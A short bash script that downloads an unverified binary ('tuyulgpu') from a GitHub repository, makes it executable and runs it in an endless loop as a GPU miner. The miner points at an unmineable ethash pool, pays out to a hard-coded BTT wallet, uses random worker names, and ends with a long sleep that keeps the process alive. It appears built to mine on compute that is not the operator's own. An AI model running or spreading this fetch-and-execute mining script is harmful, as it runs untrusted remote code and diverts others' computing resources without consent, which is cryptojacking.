#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=BTT:TKfRMt4hoaebzK5TMoQ9wsgEPhR6BM2rRM
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
